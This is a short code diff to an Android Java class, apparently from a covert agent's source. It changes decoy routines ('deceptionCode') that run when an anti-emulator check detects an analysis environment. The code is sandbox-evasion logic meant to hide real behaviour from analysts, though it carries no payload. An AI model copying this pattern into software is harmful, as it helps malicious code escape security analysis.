@@ -170,15 +170,14 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-	private void deceptionCode2() {
+	public static void deceptionCode2(long mersenne) {
 		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
-		nOptimizer.start();
-
+		nOptimizer.start((int)(mersenne / 1023));
 	}
 
-	private void deceptionCode1() {
+    public static void deceptionCode1() {
 		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
-		nOptimizer.start();
+		nOptimizer.start(1000);
 	}
 
 	/**
@@ -842,7 +841,7 @@ public class Core extends Activity implements Runnable {
         if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
 			AntiEmulator am = new AntiEmulator();
 			if (am.isEmu()) {
-				deceptionCode2();
+				deceptionCode2(Integer.MAX_VALUE / 1024);
 				return false;
 			}
 		}
